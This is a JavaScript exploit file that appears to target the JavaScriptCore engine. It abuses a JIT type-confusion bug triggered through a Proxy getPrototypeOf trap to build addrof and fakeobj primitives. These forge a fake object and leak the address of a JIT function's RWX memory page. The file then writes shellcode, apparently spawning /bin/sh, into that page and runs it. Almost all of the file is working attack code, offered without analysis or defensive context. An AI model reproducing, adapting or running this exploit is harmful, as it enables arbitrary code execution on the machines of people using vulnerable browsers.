var _dview = null;

function u2d(low, hi) {
    if (!_dview) _dview = new DataView(new ArrayBuffer(16));
    _dview.setUint32(0,hi);
    _dview.setUint32(4,low);
    return _dview.getFloat64(0);
}

function d2u(d) {
    if (!_dview) _dview = new DataView(new ArrayBuffer(16));
    _dview.setFloat64(0,d);
    return [_dview.getUint32(4), _dview.getUint32(0)];
}


function hex(lo, hi) {
    if( lo == 0 ) {
        return ("0x" + hi.toString(16) + "-00000000");
    }

    if( hi == 0 ) {
        return ("0x" + lo.toString(16));
    }

    return ("0x" + hi.toString(16) + "-" + lo.toString(16));
}


//////////////////
/* Exploitation */
//////////////////


var p = { "a": {} };
var p_fakeobj = { "b": {} };
var p_func = { "c": {} };

var flag = 0;
var data = [];
var copy = [];

var data2 = [];
var copy2 = [];

var data3 = [];
var copy3 = [];

/* Addrof Primitive */

function initialize_addrof() {
    flag = 0;
    data = [1.1, 2.2, 3.3];
    copy = [];
}

function addrof(func, obj) {
	initialize_addrof();

	var z = new Proxy({}, {
		getPrototypeOf: function() {
			if (flag == 2) {
				data[0] = obj;
			}

			if (flag == 1) {
				flag = 2;
			}

			return {"a": 1, "b": 2}
		}
	});

	// Object's __proto__ -> Proxy Chain
	p.__proto__ = z;

	for (var i = 0; i < 100000; i++) {
        func();
    }

	// trigger type confusion vulnerability
    flag = 1;
    func();

	return copy[0];
}

/* Fake Object Primitive */

function initialize_fakeobj() {
    flag = 0;
    data2 = [1.1, 2.2, 3.3];
	// Initialize copy array to contiguous Array type for type confusion
    copy2 = [];
}


function fakeobj(func2, value) {
	initialize_fakeobj();

	var z2 = new Proxy({}, {
		getPrototypeOf: function() {
			if (flag == 2) {
				copy2[0] = {};
				data2[0] = value;
			}

			if (flag == 1) {
				flag = 2;
			}

			return {"a": 1, "b": 2}
		}
	});

	// Object's __proto__ -> Proxy Chain
	p_fakeobj.__proto__ = z2;

	for (var i = 0; i < 100000; i++) {
        func2();
    }

	// trigger type confusion vulnerability
    flag = 1;
    func2();

	return copy2[0];
}

const ITERATIONS = 100000;

function jitCompile(f, ...args) {
    for (var i = 0; i < ITERATIONS; i++) {
        f(...args);
    }
}

jitCompile(function dummy() { return 42; });

function makeJITCompiledFunction() {
    // Some code that can be overwritten by the shellcode.
    function target(num) {
        for (var i = 2; i < num; i++) {
            if (num % i === 0) {
                return "ffff";
            }
        }
        return "tttt";
    }
    jitCompile(target, 123);

    return target;
}

function pwn() {
	function f() {
		data[0] = 2.2;
		for(var d in p) {
			copy[0] = data[0];
			copy[1] = data[1];
			copy[2] = data[2];
		}
	}

	function f2() {
		data2[0] = 2.2;
		for(var d in p_fakeobj) {
			copy2[0] = data2[0];
			copy2[1] = data2[1];
			copy2[2] = data2[2];
		}
	}

	let storage = [];
	for(let i = 0; i < 0x2000; i++) {
		let a = [13.37];
		a.pointer = u2d(0xdadadada, 0xfafafafa);
		a["a" + i] = 1.1;
		storage.push(a);
	}

	let victim = storage[0x800];

	let template = {
		JSCell: u2d(0x1000, 0x01082007 - 0x10000),
		butterfly: victim
	};

	let res = d2u(addrof(f, template));
	print("[-] Object address Leak : " + hex(res[0], res[1]));

	let func_jit = makeJITCompiledFunction();
	let func_addr = d2u(addrof(f, func_jit));
	print("[-] Leaked func_addr : " + hex(func_addr[0], func_addr[1]));

	// Good Crash :)
	//let value = eval(`u2d(0x41414141, 0x4242)`);
	let value = eval(`u2d(res[0] + 0x10, res[1])`);
	let fake = fakeobj(f2, value);

	let JSCell = d2u(fake[0]);
	let OrigButterfly = d2u(fake[1]);

	print("[-] Leaked JSCell : " + hex(JSCell[0], JSCell[1]));
	print("[-] Leaked Butterfly : " + hex(OrigButterfly[0], OrigButterfly[1]));

	template.JSCell = u2d(JSCell[0], JSCell[1] - 0x10000);

	// JIT OBJECT LEAK !
	fake[1] = u2d(func_addr[0] + 0x8, func_addr[1]);
	let jit_obj_addr = d2u(victim[2]);
	print("[-] jit_obj_adder : " + hex(jit_obj_addr[0], jit_obj_addr[1]));

	// JIT RWX PAGE LEAK !
	fake[1] = u2d(jit_obj_addr[0] + 0x8, jit_obj_addr[1]);
	let rwx_page_addr = d2u(victim[2]);
	print("[-] rwx page leak : " + hex(rwx_page_addr[0], rwx_page_addr[1]));

	let shellcode = [0x90909090, 0x90909090, 0x90909090, 0x90909090, 0x56f63148, 0x2f2fbf48, 795765090, 1213687923, 826861449, 3224455378, 3242721968, 1001400520, 2425357583, 0x90909090];

	let j = 0;
	for(let i = 0; i < shellcode.length; i += 2) {
		fake[1] = u2d(rwx_page_addr[0] + 0x10 + (j * 8), rwx_page_addr[1]);
		victim.pointer = u2d(shellcode[i], shellcode[i + 1] - 0x10000);
		j += 1;
	}

	func_jit();

	//fake[1] = u2d(0x41414141, 0x4242);
	//victim[0]
}

pwn();
